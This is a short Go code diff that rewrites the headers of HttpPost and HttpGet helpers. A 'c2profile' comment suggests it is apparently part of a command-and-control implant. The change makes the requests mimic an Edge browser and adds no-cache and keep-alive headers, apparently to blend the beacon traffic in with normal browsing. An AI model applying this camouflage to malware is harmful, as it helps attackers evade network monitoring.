@@ -25,8 +25,15 @@ func init() {
 
 //TODO c2profile
 func HttpPost(url string, data []byte) *req.Resp {
+	httpHeaders := req.Header{
+		"User-Agent": 		"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10136",
+		"Accept":     		"*/*",
+		"Cache-Control": 	"no-cache",
+		"Connection":		"Keep-Alive",
+		"Pragma":	  		"no-cache",
+	}
 	for  {
-		resp, err := httpRequest.Post(url, data)
+		resp, err := httpRequest.Post(url, data, httpHeaders)
 		if err != nil {
 			fmt.Printf("!error: %v\n",err)
 			time.Sleep(config.WaitTime)
@@ -44,9 +51,12 @@ func HttpPost(url string, data []byte) *req.Resp {
 }
 func HttpGet(url string, cookies string) *req.Resp {
 	httpHeaders := req.Header{
-		"User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BOIE9;ENUS)",
-		"Accept":     "*/*",
-		"Cookie":     cookies,
+		"User-Agent": 		"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10136",
+		"Accept":     		"*/*",
+		"Cache-Control": 	"no-cache",
+		"Connection":		"Keep-Alive",
+		"Pragma":	  		"no-cache",
+		"Cookie":     		cookies,
 	}
 	for {
 		resp, err := httpRequest.Get(url, httpHeaders)
